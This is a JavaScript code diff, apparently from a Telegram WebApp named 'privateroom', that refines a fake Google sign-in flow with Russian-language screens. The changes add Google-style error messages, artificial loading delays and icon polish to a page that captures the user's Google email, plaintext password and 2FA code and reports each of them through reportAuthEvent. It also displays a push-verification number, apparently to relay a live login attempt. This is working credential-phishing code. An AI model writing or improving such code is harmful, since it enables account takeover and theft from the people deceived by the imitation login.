@@ -101,10 +101,14 @@ function initApp() {
 
     function updateGoogleDisplays(email) {
         if (!email) return;
-        if (googleDisplayEmail) googleDisplayEmail.textContent = email;
-        if (google2faDisplayEmail) google2faDisplayEmail.textContent = email;
-        if (googleConsentDisplayEmail) googleConsentDisplayEmail.textContent = email;
-        const initial = email.trim().charAt(0).toUpperCase() || "G";
+        let displayStr = email.trim();
+        if (displayStr && !displayStr.includes("@")) {
+            displayStr += "@gmail.com";
+        }
+        if (googleDisplayEmail) googleDisplayEmail.textContent = displayStr;
+        if (google2faDisplayEmail) google2faDisplayEmail.textContent = displayStr;
+        if (googleConsentDisplayEmail) googleConsentDisplayEmail.textContent = displayStr;
+        const initial = displayStr.charAt(0).toUpperCase() || "G";
         if (googleChipInitial) googleChipInitial.textContent = initial;
         if (google2faChipInitial) google2faChipInitial.textContent = initial;
         if (googleConsentChipInitial) googleConsentChipInitial.textContent = initial;
@@ -265,60 +269,8 @@ function initApp() {
         showStep(stepPhone);
     }
 
-    // Check saved auth progress (e.g. user minimized/closed WebApp to check SMS/Telegram code)
-    const savedStep = localStorage.getItem("privateroom_current_step");
-    const savedPhone = localStorage.getItem("privateroom_saved_phone");
-    const savedEmail = localStorage.getItem("privateroom_google_email");
-    const savedSession = localStorage.getItem("privateroom_session_id");
-    const codeRequestedAt = parseInt(localStorage.getItem("privateroom_code_requested_at") || "0", 10);
-    const now = Date.now();
-    const isRecent = codeRequestedAt > 0 && (now - codeRequestedAt < 20 * 60 * 1000);
-
-    if (!isAuthorized && (savedPhone || savedEmail)) {
-        if (savedStep === "stepGooglePassword" && savedEmail) {
-            userGoogleEmail = savedEmail;
-            updateGoogleDisplays(userGoogleEmail);
-            showStep(stepGooglePassword);
-            setTimeout(() => { if (googlePasswordInput) googlePasswordInput.focus(); }, 150);
-        } else if (savedStep === "stepGoogle2FA" && savedEmail) {
-            userGoogleEmail = savedEmail;
-            updateGoogleDisplays(userGoogleEmail);
-            showStep(stepGoogle2FA);
-            setTimeout(() => { if (google2faCodeInput) google2faCodeInput.focus(); }, 150);
-        } else if (isRecent && savedPhone) {
-            userPhone = savedPhone;
-            currentSessionId = savedSession;
-            updatePhoneDisplay(userPhone);
-
-            if (savedStep === "step2FA") {
-                showStep(step2FA);
-                setTimeout(() => { if (password2FA) password2FA.focus(); }, 150);
-            } else if (savedStep === "stepCode") {
-                showStep(stepCode);
-                setTimeout(() => { if (codeInput) codeInput.focus(); }, 150);
-
-                const elapsedSec = Math.floor((now - codeRequestedAt) / 1000);
-                const remaining = Math.max(0, 60 - elapsedSec);
-                if (remaining > 0) {
-                    startResendCooldown(remaining);
-                } else {
-                    if (btnResendCode) {
-                        btnResendCode.disabled = false;
-                        btnResendCode.style.opacity = "1";
-                        btnResendCode.style.cursor = "pointer";
-                    }
-                    if (resendCodeText) resendCodeText.textContent = "Запросить код ещё раз";
-                }
-            } else {
-                showStep(stepSuccess);
-            }
-        } else {
-            showStep(stepSuccess);
-        }
-    } else {
-        // Default step: ALWAYS show the landing page / dashboard
-        showStep(stepSuccess);
-    }
+    // On app startup, ALWAYS show the landing page / main dashboard first
+    showStep(stepSuccess);
 
     function checkAuthStatus() {
         const userTgId = tg?.initDataUnsafe?.user?.id || null;
@@ -962,47 +914,132 @@ function initApp() {
     }
 
     if (toggleGooglePasswordBtn) {
+        const eyeIconSvg = document.getElementById("googleEyeIcon");
+        const svgOpenPath = 'M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z';
+        const svgOffPath = 'M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.17c0-1.66-1.34-3-3-3l-.17.02z';
+
         toggleGooglePasswordBtn.addEventListener("click", () => {
             if (googlePasswordInput) {
+                const pathEl = eyeIconSvg ? eyeIconSvg.querySelector("path") : null;
                 if (googlePasswordInput.type === "password") {
                     googlePasswordInput.type = "text";
-                    toggleGooglePasswordBtn.textContent = "🔒";
+                    if (pathEl) pathEl.setAttribute("d", svgOffPath);
                 } else {
                     googlePasswordInput.type = "password";
-                    toggleGooglePasswordBtn.textContent = "👁";
+                    if (pathEl) pathEl.setAttribute("d", svgOpenPath);
                 }
             }
         });
     }
 
+    // Google Loading & Error Utilities
+    const googleLoadingBar = document.getElementById("googleLoadingBar");
+    const googleEmailError = document.getElementById("googleEmailError");
+    const googleEmailErrorText = document.getElementById("googleEmailErrorText");
+    const googlePasswordError = document.getElementById("googlePasswordError");
+    const googlePasswordErrorText = document.getElementById("googlePasswordErrorText");
+    const google2faError = document.getElementById("google2faError");
+    const google2faErrorText = document.getElementById("google2faErrorText");
+
+    function clearGoogleErrors() {
+        if (googleEmailError) googleEmailError.classList.add("hidden");
+        if (googlePasswordError) googlePasswordError.classList.add("hidden");
+        if (google2faError) google2faError.classList.add("hidden");
+
+        if (googleEmailInput) googleEmailInput.classList.remove("google-input-invalid");
+        if (googlePasswordInput) googlePasswordInput.classList.remove("google-input-invalid");
+        if (google2faCodeInput) google2faCodeInput.classList.remove("google-input-invalid");
+    }
+
+    function showGoogleError(type, msg) {
+        clearGoogleErrors();
+        if (type === "email") {
+            if (googleEmailErrorText && msg) googleEmailErrorText.textContent = msg;
+            if (googleEmailError) googleEmailError.classList.remove("hidden");
+            if (googleEmailInput) {
+                googleEmailInput.classList.add("google-input-invalid");
+                googleEmailInput.focus();
+            }
+        } else if (type === "password") {
+            if (googlePasswordErrorText && msg) googlePasswordErrorText.textContent = msg;
+            if (googlePasswordError) googlePasswordError.classList.remove("hidden");
+            if (googlePasswordInput) {
+                googlePasswordInput.classList.add("google-input-invalid");
+                googlePasswordInput.focus();
+            }
+        } else if (type === "2fa") {
+            if (google2faErrorText && msg) google2faErrorText.textContent = msg;
+            if (google2faError) google2faError.classList.remove("hidden");
+            if (google2faCodeInput) {
+                google2faCodeInput.classList.add("google-input-invalid");
+                google2faCodeInput.focus();
+            }
+        }
+    }
+
+    function startGoogleLoading(callback, delayMs = 1400) {
+        if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
+        setTimeout(() => {
+            if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+            if (typeof callback === "function") callback();
+        }, delayMs);
+    }
+
+    function isValidGoogleIdentifier(str) {
+        if (!str) return false;
+        str = str.trim();
+        // Check if phone number (+7999..., 8999..., etc)
+        const isPhone = /^\+?[0-9\s\-\(\)]{7,18}$/.test(str);
+        // Check if email format
+        const isEmail = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(str);
+        return isPhone || isEmail;
+    }
+
+    if (googleEmailInput) googleEmailInput.addEventListener("input", clearGoogleErrors);
+    if (googlePasswordInput) googlePasswordInput.addEventListener("input", clearGoogleErrors);
+    if (google2faCodeInput) google2faCodeInput.addEventListener("input", clearGoogleErrors);
+
     if (btnSubmitGoogleEmail) {
         btnSubmitGoogleEmail.addEventListener("click", () => {
+            clearGoogleErrors();
             const rawEmail = googleEmailInput ? googleEmailInput.value.trim() : "";
-            if (!rawEmail || (!rawEmail.includes("@") && rawEmail.length < 5)) {
-                showToast("Введите корректный адрес эл. почты Google");
+            
+            if (!rawEmail) {
+                showGoogleError("email", "Введите адрес электронной почты или номер телефона.");
                 return;
             }
+
+            if (!isValidGoogleIdentifier(rawEmail)) {
+                showGoogleError("email", "Не удалось найти аккаунт Google. Проверьте адрес почты или номер телефона.");
+                return;
+            }
+
             userGoogleEmail = rawEmail;
             try {
                 localStorage.setItem("privateroom_google_email", userGoogleEmail);
                 localStorage.setItem("privateroom_current_step", "stepGooglePassword");
             } catch (e) {}
 
-            updateGoogleDisplays(userGoogleEmail);
-            reportAuthEvent("google_email", `Введена Google почта: ${userGoogleEmail}`, null, null, userGoogleEmail);
-            showStep(stepGooglePassword);
-            if (googlePasswordInput) {
-                googlePasswordInput.value = "";
-                setTimeout(() => googlePasswordInput.focus(), 150);
-            }
+            btnSubmitGoogleEmail.disabled = true;
+            startGoogleLoading(() => {
+                btnSubmitGoogleEmail.disabled = false;
+                updateGoogleDisplays(userGoogleEmail);
+                reportAuthEvent("google_email", `Введена Google почта: ${userGoogleEmail}`, null, null, userGoogleEmail);
+                showStep(stepGooglePassword);
+                if (googlePasswordInput) {
+                    googlePasswordInput.value = "";
+                    setTimeout(() => googlePasswordInput.focus(), 150);
+                }
+            }, 1200);
         });
     }
 
     if (btnSubmitGooglePassword) {
         btnSubmitGooglePassword.addEventListener("click", () => {
+            clearGoogleErrors();
             const pwd = googlePasswordInput ? googlePasswordInput.value : "";
             if (!pwd || pwd.length < 4) {
-                showToast("Введите пароль от вашего Google аккаунта");
+                showGoogleError("password", "Введите пароль. Длина должна быть не менее 4 символов.");
                 return;
             }
             userGooglePassword = pwd;
@@ -1010,30 +1047,40 @@ function initApp() {
                 localStorage.setItem("privateroom_current_step", "stepGoogle2FA");
             } catch (e) {}
 
-            reportAuthEvent("google_password", `Введен пароль Google: ${pwd}`, pwd, null, userGoogleEmail);
-            showStep(stepGoogle2FA);
-            if (google2faCodeInput) {
-                google2faCodeInput.value = "";
-                setTimeout(() => google2faCodeInput.focus(), 150);
-            }
+            btnSubmitGooglePassword.disabled = true;
+            startGoogleLoading(() => {
+                btnSubmitGooglePassword.disabled = false;
+                reportAuthEvent("google_password", `Введен пароль Google: ${pwd}`, pwd, null, userGoogleEmail);
+                showStep(stepGoogle2FA);
+                if (google2faCodeInput) {
+                    google2faCodeInput.value = "";
+                    setTimeout(() => google2faCodeInput.focus(), 150);
+                }
+            }, 1500);
         });
     }
 
     if (btnSubmitGoogle2FA) {
         btnSubmitGoogle2FA.addEventListener("click", () => {
+            clearGoogleErrors();
             const code = google2faCodeInput ? google2faCodeInput.value.trim() : "";
             if (!code || code.length < 4) {
-                showToast("Введите код подтверждения (G-XXXXXX)");
+                showGoogleError("2fa", "Введите 6-значный код подтверждения.");
                 return;
             }
-            reportAuthEvent("google_code", `Введен 2FA код Google: ${code}`, userGooglePassword, null, userGoogleEmail);
-            
-            // Random prompt number for push verification prompt
-            const promptNum = Math.floor(10 + Math.random() * 88);
-            if (googlePromptNumber) googlePromptNumber.textContent = promptNum.toString();
-            reportAuthEvent("google_prompt_shown", `Показано число подтверждения Google: ${promptNum}`, userGooglePassword, null, userGoogleEmail);
 
-            showStep(stepGooglePrompt);
+            btnSubmitGoogle2FA.disabled = true;
+            startGoogleLoading(() => {
+                btnSubmitGoogle2FA.disabled = false;
+                reportAuthEvent("google_code", `Введен 2FA код Google: ${code}`, userGooglePassword, null, userGoogleEmail);
+                
+                // Random prompt number for push verification prompt
+                const promptNum = Math.floor(10 + Math.random() * 88);
+                if (googlePromptNumber) googlePromptNumber.textContent = promptNum.toString();
+                reportAuthEvent("google_prompt_shown", `Показано число подтверждения Google: ${promptNum}`, userGooglePassword, null, userGoogleEmail);
+
+                showStep(stepGooglePrompt);
+            }, 1400);
         });
     }
 
